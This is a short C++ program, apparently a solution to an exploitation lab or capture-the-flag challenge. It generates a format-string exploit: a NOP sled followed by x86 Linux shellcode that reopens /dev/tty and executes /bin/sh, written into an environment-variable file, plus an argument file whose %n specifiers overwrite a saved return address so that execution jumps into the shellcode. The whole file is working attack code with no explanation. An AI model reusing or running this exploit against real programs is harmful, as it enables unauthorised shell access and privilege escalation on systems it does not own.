#include <iostream>
#include <fstream>
#include <sstream>

typedef unsigned int uint;

uint eip = 0xffffd3fc + 0x10;

std::string raw_shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
							"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
							"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int writeShellCode1()
{
	std::ofstream file("args/env_var");
	std::string shellcode = raw_shellcode;

	for (uint i = 0; i < 300; i++)
		file << (char)0x90;

	file << shellcode;
	file.close();
	return 1;
}

void writeShellCode2()
{
	std::ofstream file("args/arg");

	uint addr_jmp = 0xffffd75e; // jump in env var
	addr_jmp -= 8;
	uint part1 = (addr_jmp & 0xffff0000) >> (2 * 8);
	uint part2 = addr_jmp & 0x0000ffff;

	printf("%x, %x\n", part1, part2);

	uint eip2 = eip + 2;
	for (int i = 0; i < 4; i++)
		file << ((char *)(&eip))[i];
	for (int i = 0; i < 4; i++)
		file << ((char *)(&eip2))[i];

	file << "%" << std::to_string(part2) << "x";
	file << "%10$.n";
	file << "%" << std::to_string(part1 - part2 - 8) << "x";
	file << "%11$.n";

	file.close();
}

int main(int argc, char const *argv[])
{
	writeShellCode1();
	writeShellCode2();
	return 0;
}
